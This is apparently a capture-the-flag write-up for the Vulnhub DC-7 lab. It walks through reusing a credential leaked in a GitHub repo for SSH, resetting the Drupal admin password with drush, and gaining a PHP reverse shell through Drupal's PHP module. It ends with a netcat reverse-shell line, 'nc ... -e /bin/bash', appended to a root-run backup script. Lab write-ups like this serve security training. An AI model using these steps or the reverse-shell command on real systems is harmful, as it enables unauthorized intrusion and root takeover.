<h1>DC-7 Write-up</h1>

<h2>NMAP</h2>

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))

```
**PORT 80**

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-7/images/username.png)

Found a Github repo : with user **"DC7User"** :

https://github.com/Dc7User/staffdb

Found password from config.php 
* https://github.com/Dc7User/staffdb/blob/master/config.php

```
servername = "localhost"
username = "dc7user"
password = "MdR3xOgB7#dW"
dbname = "Staff"
```

Login SSH :

```
Username : dc7user 
password : MdR3xOgB7#dW
```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-7/images/dc7user.png)

I Found a mail in home directory of dc7user, root is executing /opt/scripts/backup.sh and dc7user can't edit that file so i checked who can then i found that www-data can so first i have to become www-data.

I checked how to change drupal password then i found this command : 

**NOTE : YOU MUST BE IN /var/www/html BEFORE EXECUTING THIS COMMAND**

```
cd /var/www/html
drush user-password admin --password=vanshal
```

<h4>Taking Shell as www-data : </h4>

Drupal 8 removed php from its core so to install it :

1 ) Go to "Extend > Install New Module" 

2 ) download this File in your box : https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz

3 ) Select this file from "Install New module" Option 

4 ) Enable php from "Extend" 

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-7/images/phpdrupal.png)

5 ) Home >Content > Add Content  > Basic Page 

6 ) Paste your php shellcode :

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-7/images/drupalupload.png  )

7 ) Select Text Format as php

8 ) Start Listner 

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-7/images/wwwshell.png)

9 ) Click on Save Button

<h3>PRIVILEGE ESCALATION:</h3>

Add rev shell code in /opt/scripts/backups.sh:

ie : nc 192.168.56.1 1337 -e /bin/bash

Start Listner and wait for the shell 

 ![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-7/images/rootshell.png)
 
 <h2>FLAG</h2>
 
 ![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-7/images/Flag.png)
